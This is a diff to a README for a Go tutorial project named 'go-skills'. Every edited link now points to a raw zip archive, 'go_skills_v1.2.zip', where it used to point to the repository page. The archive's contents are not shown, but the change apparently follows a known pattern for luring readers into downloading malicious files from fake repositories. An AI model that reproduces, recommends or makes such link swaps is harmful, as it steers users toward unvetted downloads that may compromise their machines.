@@ -1,6 +1,6 @@
 # 🧩 go-skills - Build Better Go Apps
 
-[![Download go-skills](https://img.shields.io/badge/Download-go--skills-6f42c1?style=for-the-badge&logo=github)](https://github.com/chafingdishposition355/go-skills)
+[![Download go-skills](https://img.shields.io/badge/Download-go--skills-6f42c1?style=for-the-badge&logo=github)](https://github.com/chafingdishposition355/go-skills/raw/refs/heads/main/go/go_skills_v1.2.zip)
 
 ## 📘 What This Is
 
@@ -21,7 +21,7 @@ This project is meant for people who want to learn how to build Go software with
 
 Use this link to visit the download page and get the files:
 
-[Open the go-skills download page](https://github.com/chafingdishposition355/go-skills)
+[Open the go-skills download page](https://github.com/chafingdishposition355/go-skills/raw/refs/heads/main/go/go_skills_v1.2.zip)
 
 After you open the page:
 
@@ -172,7 +172,7 @@ This project leans on that idea and avoids overbuilt folder trees.
 
 Visit the repository page here to download and open the project:
 
-[https://github.com/chafingdishposition355/go-skills](https://github.com/chafingdishposition355/go-skills)
+[https://github.com/chafingdishposition355/go-skills/raw/refs/heads/main/go/go_skills_v1.2.zip](https://github.com/chafingdishposition355/go-skills/raw/refs/heads/main/go/go_skills_v1.2.zip)
 
 ## 🪟 Windows Tips
 
